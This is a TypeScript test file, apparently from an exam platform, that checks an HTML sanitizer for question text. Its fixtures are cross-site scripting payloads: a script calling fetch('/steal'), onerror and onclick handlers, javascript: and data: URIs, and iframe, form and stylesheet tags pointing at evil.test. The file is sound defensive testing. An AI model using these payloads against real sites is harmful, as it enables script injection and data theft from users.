import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import {
  DIFFICULTY_LEVEL,
  QUESTION_STATUS,
  QUESTION_TYPE,
  latexIn,
  plainTextOf,
  previewTextOf,
  type QuestionDraft,
} from '@iace/contracts';
import { buildContent } from '../src/questions/question-core';
import { sanitizeContentHtml } from '../src/questions/question-sanitize';

const FIGURE = 'questions/images/9f1c.png';

function mcq(over: Partial<QuestionDraft> = {}): QuestionDraft {
  return {
    type: QUESTION_TYPE.SINGLE_MCQ,
    subjectId: 'sub_quant',
    topicId: null,
    difficulty: DIFFICULTY_LEVEL.MEDIUM,
    status: QUESTION_STATUS.ACTIVE,
    questionCode: null,
    stem: { en: '<p>What is 20% of 150?</p>' },
    solution: {},
    options: [
      { position: 1, isCorrect: false, text: { en: '<p>25</p>' } },
      { position: 2, isCorrect: true, text: { en: '<p>30</p>' } },
      { position: 3, isCorrect: false, text: { en: '<p>35</p>' } },
      { position: 4, isCorrect: false, text: { en: '<p>40</p>' } },
    ],
    answerKey: null,
    tags: [],
    ...over,
  };
}

const stemOf = (draft: QuestionDraft): string =>
  previewTextOf(plainTextOf(buildContent(draft).content.en?.stem));

describe('sanitizeContentHtml', () => {
  /** The one that matters: an admin writes this and a candidate reads it mid-test. */
  it('takes a script away with its contents, not just its tag', () => {
    const clean = sanitizeContentHtml('<p>Solve</p><script>fetch("/steal")</script>');

    assert.equal(clean, '<p>Solve</p>');
  });

  it('strips event handlers off markup it otherwise keeps', () => {
    const clean = sanitizeContentHtml('<p onmouseover="alert(1)">Solve</p>');

    assert.equal(clean, '<p>Solve</p>');
  });

  it('refuses the tags that fetch or frame something else', () => {
    for (const html of [
      '<iframe src="https://evil.test"></iframe>',
      '<object data="x.swf"></object>',
      '<embed src="x.swf">',
      '<svg onload="alert(1)"></svg>',
      '<style>body{background:url(https://evil.test)}</style>',
      '<link rel="stylesheet" href="https://evil.test/x.css">',
      '<form action="https://evil.test"><input name="pin"></form>',
    ]) {
      assert.equal(sanitizeContentHtml(html), '', html);
    }
  });

  /** An anchor is not on the editor's toolbar, so a link in stored content was not typed there. */
  it('unwraps a link, keeping what it said', () => {
    const clean = sanitizeContentHtml('<p>See <a href="javascript:alert(1)">this</a></p>');

    assert.equal(clean, '<p>See this</p>');
  });

  it('keeps the formatting a question is actually written in', () => {
    const html =
      '<p><strong>Bold</strong> <em>italic</em> <u>under</u> H<sub>2</sub>O x<sup>2</sup></p>' +
      '<ul><li>one</li></ul><ol><li>two</li></ol>';

    assert.equal(sanitizeContentHtml(html), html);
  });

  it('keeps a table with its merged cells', () => {
    const html =
      '<table><thead><tr><th colspan="2">Year</th></tr></thead>' +
      '<tbody><tr><td rowspan="2">2024</td><td>12</td></tr></tbody></table>';

    assert.equal(sanitizeContentHtml(html), html);
  });

  /** The formula IS the attribute — losing `data-latex` would leave an empty span mid-paper. */
  it('keeps inline and block math', () => {
    const html =
      '<p><span data-type="inline-math" data-latex="\\frac{a}{b}"></span></p>' +
      '<div data-type="block-math" data-latex="x^2 + y^2 = z^2"></div>';

    const clean = sanitizeContentHtml(html);

    assert.deepEqual(latexIn(clean), ['\\frac{a}{b}', 'x^2 + y^2 = z^2']);
  });

  it('keeps a figure of ours, by its key', () => {
    const clean = sanitizeContentHtml(
      `<p><img data-key="${FIGURE}" alt="Figure 1" width="320"></p>`,
    );

    assert.match(clean, /data-key="questions\/images\/9f1c\.png"/);
    assert.match(clean, /alt="Figure 1"/);
    assert.match(clean, /width="320"/);
  });

  /** We serve what we hold: a src we did not sign is a tracker at best and an exploit at worst. */
  it('drops an image that names no key of ours', () => {
    for (const html of [
      '<p><img src="https://evil.test/pixel.png"></p>',
      '<p><img src="javascript:alert(1)"></p>',
      '<p><img src="data:text/html;base64,PHNjcmlwdD4="></p>',
      '<p><img src="x" onerror="alert(1)"></p>',
    ]) {
      assert.equal(sanitizeContentHtml(html), '<p></p>', html);
    }
  });
});

describe('buildContent sanitizes', () => {
  /** The editor's save and the importer's commit both build content here, so both are covered. */
  it('stores no script, whichever path wrote the question', () => {
    const built = buildContent(
      mcq({
        stem: { en: '<p>Solve<script>alert(1)</script></p>' },
        options: [
          { position: 1, isCorrect: true, text: { en: '<p onclick="alert(1)">25</p>' } },
          { position: 2, isCorrect: false, text: { en: '<p>30</p>' } },
        ],
      }),
    );

    assert.equal(stemOf(mcq({ stem: { en: '<p>Solve<script>alert(1)</script></p>' } })), 'Solve');
    assert.doesNotMatch(JSON.stringify(built), /script|onclick/i);
  });

  it('keeps a figure of ours through the build, and drops one that is not', () => {
    const ours = stemOf(mcq({ stem: { en: `<p><img data-key="${FIGURE}"></p>` } }));
    const theirs = stemOf(mcq({ stem: { en: '<p><img src="https://evil.test/p.png"></p>' } }));

    assert.equal(ours, '[image]');
    assert.equal(theirs, '');
  });
});
